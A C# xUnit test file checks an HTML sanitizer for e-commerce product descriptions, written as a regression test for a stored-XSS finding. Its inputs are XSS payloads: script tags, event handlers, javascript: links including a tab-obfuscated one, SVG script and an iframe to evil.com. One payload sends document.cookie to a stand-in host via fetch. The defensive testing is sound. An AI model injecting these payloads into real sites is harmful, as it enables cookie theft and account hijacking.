using Ashianebargh.Application.Helpers;
using Xunit;

namespace Ashianebargh.Tests;

/// <summary>
/// پالایشگر HTML توضیحات محصول: رگرسیونِ یافتهٔ «XSS ذخیره‌شده از طریق MarkupString خام».
/// عناصر/صفات خطرناک باید حذف شوند و ساختار جدولِ مشخصات و متن سالم بماند.
/// </summary>
public class HtmlContentSanitizerTests
{
    [Fact]
    public void Sanitize_NullOrEmpty_ReturnsEmpty()
    {
        Assert.Equal(string.Empty, HtmlContentSanitizer.Sanitize(null));
        Assert.Equal(string.Empty, HtmlContentSanitizer.Sanitize("   "));
    }

    [Fact]
    public void Sanitize_RemovesScriptElement_ButKeepsTable()
    {
        var result = HtmlContentSanitizer.Sanitize(
            "<table><tr><td>ok</td></tr></table><script>alert(1)</script>");

        Assert.DoesNotContain("<script", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert(1)", result);
        Assert.Contains("<table>", result);
        Assert.Contains("ok", result);
    }

    [Fact]
    public void Sanitize_RemovesEventHandlerAttributes()
    {
        var result = HtmlContentSanitizer.Sanitize(
            "<table onload=\"alert(1)\"><tr><td onclick=\"evil()\">x</td></tr></table>");

        Assert.DoesNotContain("onload", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onclick", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("<table>", result);
    }

    [Fact]
    public void Sanitize_RemovesImgOnError_AndInvalidSrc()
    {
        var result = HtmlContentSanitizer.Sanitize("<img src=\"x\" onerror=\"alert(1)\">");

        Assert.DoesNotContain("onerror", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert(1)", result);
    }

    [Fact]
    public void Sanitize_RejectsJavascriptHref()
    {
        var result = HtmlContentSanitizer.Sanitize("<a href=\"javascript:alert(1)\">link</a>");

        Assert.DoesNotContain("javascript:", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("link", result);
    }

    [Fact]
    public void Sanitize_RejectsJavascriptHref_WithEmbeddedControlChars()
    {
        // مرورگر tab را از URL حذف می‌کند؛ پالایشگر هم باید پیش از اعتبارسنجی حذف کند.
        var result = HtmlContentSanitizer.Sanitize("<a href=\"java\tscript:alert(1)\">link</a>");

        Assert.DoesNotContain("script:", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert(1)", result);
    }

    [Fact]
    public void Sanitize_KeepsSafeHttpHref()
    {
        var result = HtmlContentSanitizer.Sanitize("<a href=\"https://example.com\">link</a>");

        Assert.Contains("href=\"https://example.com\"", result);
    }

    [Fact]
    public void Sanitize_KeepsRelativeInternalHref()
    {
        var result = HtmlContentSanitizer.Sanitize("<a href=\"/products\">link</a>");

        Assert.Contains("href=\"/products\"", result);
    }

    [Fact]
    public void Sanitize_RemovesStyleAndClassAttributes()
    {
        var result = HtmlContentSanitizer.Sanitize(
            "<table class=\"x\" style=\"background:url(javascript:alert(1))\"><tr><td style=\"color:red\">x</td></tr></table>");

        Assert.DoesNotContain("style=", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("class=", result, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Sanitize_RemovesSvgAndMath_ForeignContent()
    {
        var result = HtmlContentSanitizer.Sanitize(
            "<svg><script>alert(1)</script></svg><math><mtext>x</mtext></math><p>ok</p>");

        Assert.DoesNotContain("<svg", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<math", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("alert(1)", result);
        Assert.Contains("ok", result);
    }

    [Fact]
    public void Sanitize_RemovesIframeAndObject()
    {
        var result = HtmlContentSanitizer.Sanitize(
            "<iframe src=\"https://evil.com\"></iframe><object data=\"x\"></object><p>ok</p>");

        Assert.DoesNotContain("<iframe", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<object", result, StringComparison.OrdinalIgnoreCase);
        Assert.Contains("ok", result);
    }

    [Fact]
    public void Sanitize_PreservesTableStructure_AndCellSpans()
    {
        var result = HtmlContentSanitizer.Sanitize(
            "<table><thead><tr><th colspan=\"2\">h</th></tr></thead><tbody><tr><td rowspan=\"2\">a</td><td>b</td></tr></tbody></table>");

        Assert.Contains("<thead>", result);
        Assert.Contains("<tbody>", result);
        Assert.Contains("colspan=\"2\"", result);
        Assert.Contains("rowspan=\"2\"", result);
    }

    [Fact]
    public void Sanitize_UnwrapsUnknownBenignElement_KeepsText()
    {
        var result = HtmlContentSanitizer.Sanitize("<customtag>hello</customtag>");

        Assert.DoesNotContain("customtag", result);
        Assert.Contains("hello", result);
    }

    [Fact]
    public void Sanitize_RemovesComments()
    {
        var result = HtmlContentSanitizer.Sanitize("<!-- secret --><p>ok</p>");

        Assert.DoesNotContain("<!--", result);
        Assert.DoesNotContain("secret", result);
        Assert.Contains("ok", result);
    }

    [Fact]
    public void Sanitize_KeepsPlainText()
    {
        var result = HtmlContentSanitizer.Sanitize("just plain text");

        Assert.Contains("just plain text", result);
    }

    [Fact]
    public void Sanitize_EncodesTextThatLooksLikeHtml()
    {
        // متنِ entity-encoded نباید هنگام سریال‌سازی به تگ واقعی تبدیل شود.
        var result = HtmlContentSanitizer.Sanitize("&lt;script&gt;alert(1)&lt;/script&gt;");

        Assert.DoesNotContain("<script>", result);
    }

    [Fact]
    public void Sanitize_NeutralizesStoredXss_InSpecTable()
    {
        var payload =
            "<table><tr><td><img src=x onerror=alert(document.cookie)>" +
            "<script>fetch('https://evil/'+document.cookie)</script>spec</td></tr></table>";

        var result = HtmlContentSanitizer.Sanitize(payload);

        Assert.DoesNotContain("onerror", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<script", result, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("document.cookie", result);
        Assert.Contains("spec", result);
        Assert.Contains("<table>", result);
    }
}